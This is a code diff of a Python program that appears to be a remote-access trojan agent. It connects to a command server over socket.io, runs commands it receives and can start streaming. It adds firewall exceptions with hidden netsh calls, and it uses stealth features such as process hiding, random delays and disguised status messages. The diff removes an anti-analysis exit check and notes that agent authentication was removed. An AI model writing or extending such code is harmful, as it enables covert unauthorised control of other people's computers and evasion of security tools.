@@ -86,43 +86,34 @@ try:
 except ImportError:
     pass
 
-# Import stealth enhancer first
-try:
-    from stealth_enhancer import *
-    STEALTH_AVAILABLE = True
-except ImportError:
-    STEALTH_AVAILABLE = False
-    print("Warning: stealth_enhancer not available, using basic stealth")
+# Stealth functions
+def hide_process():
+    """Basic process hiding."""
+    if WINDOWS_AVAILABLE:
+        try:
+            # Set process to run in background with low priority
+            process = psutil.Process()
+            process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
+            return True
+        except:
+            return False
+    return False
 
-# Define basic stealth functions if stealth_enhancer is not available
-if not STEALTH_AVAILABLE:
-    def hide_process():
-        """Basic process hiding."""
-        if WINDOWS_AVAILABLE:
-            try:
-                # Set process to run in background with low priority
-                process = psutil.Process()
-                process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
-                return True
-            except:
-                return False
-        return False
-    
-    def add_firewall_exception():
-        """Basic firewall exception."""
-        if WINDOWS_AVAILABLE:
-            try:
-                current_exe = sys.executable if hasattr(sys, 'executable') else 'python.exe'
-                rule_name = f"Python Agent {uuid.uuid4()}"
-                subprocess.run([
-                    'netsh', 'advfirewall', 'firewall', 'add', 'rule',
-                    f'name={rule_name}', 'dir=in', 'action=allow',
-                    f'program={current_exe}'
-                ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
-                return True
-            except:
-                return False
-        return False
+def add_firewall_exception():
+    """Basic firewall exception."""
+    if WINDOWS_AVAILABLE:
+        try:
+            current_exe = sys.executable if hasattr(sys, 'executable') else 'python.exe'
+            rule_name = f"Python Agent {uuid.uuid4()}"
+            subprocess.run([
+                'netsh', 'advfirewall', 'firewall', 'add', 'rule',
+                f'name={rule_name}', 'dir=in', 'action=allow',
+                f'program={current_exe}'
+            ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
+            return True
+        except:
+            return False
+    return False
 
 # Standard library imports
 import requests
@@ -7137,15 +7128,11 @@ def connect():
     """Handle connection to server."""
     agent_id = get_or_create_agent_id()
     
-    # Add multiple stealth delays
-    if STEALTH_AVAILABLE:
-        stealth_delay()
+    # Add stealth delay
+    sleep_random_non_blocking()
     
-    # Obfuscated connection message
-    if STEALTH_AVAILABLE:
-        print(f"System service connected. Session: {agent_id[:8]}...")
-    else:
-        print(f"Connected to server. Registering with agent_id: {agent_id}")
+    # Connection message
+    print(f"Connected to server. Registering with agent_id: {agent_id}")
     
     sio.emit('agent_connect', {'agent_id': agent_id})
 
@@ -7161,9 +7148,8 @@ def on_command(data):
     command = data.get("command")
     output = ""
 
-    # Add multiple stealth delays
-    if STEALTH_AVAILABLE:
-        stealth_delay()
+    # Add stealth delay
+    sleep_random_non_blocking()
 
     internal_commands = {
         "start-stream": lambda: start_streaming(agent_id),
@@ -7571,15 +7557,10 @@ def signal_handler(signum, frame):
 
 if __name__ == "__main__":
     # Initialize basic stealth mode
-    if STEALTH_AVAILABLE:
-        try:
-            if not initialize_advanced_stealth():
-                print("[STEALTH] Analysis environment detected, exiting...")
-                sys.exit(0)
-            print("[STEALTH] Basic stealth mode initialized")
-            stealth_delay()  # Add random delay
-        except Exception as e:
-            print(f"[STEALTH] Stealth initialization failed: {e}")
+    try:
+        sleep_random_non_blocking()  # Add random delay
+    except Exception as e:
+        print(f"[STEALTH] Stealth initialization failed: {e}")
     
     # Obfuscate startup messages
     startup_messages = [
@@ -7637,9 +7618,8 @@ if __name__ == "__main__":
                 connection_attempts += 1
                 print(f"Network connection attempt {connection_attempts}...")
                 
-                # Add multiple stealth delays
-                if STEALTH_AVAILABLE:
-                    stealth_delay()
+                # Add stealth delay
+                sleep_random_non_blocking()
                 
                 sio.connect(SERVER_URL)
                 print("[OK] Network connection established!")
@@ -7676,8 +7656,11 @@ if __name__ == "__main__":
         except:
             pass
         
-        # Clear sensitive memory with multiple methods
-        if STEALTH_AVAILABLE:
-            clear_memory()
+        # Clear sensitive memory
+        try:
+            import gc
+            gc.collect()
+        except:
+            pass
 
 # Agent authentication removed - direct access enabled
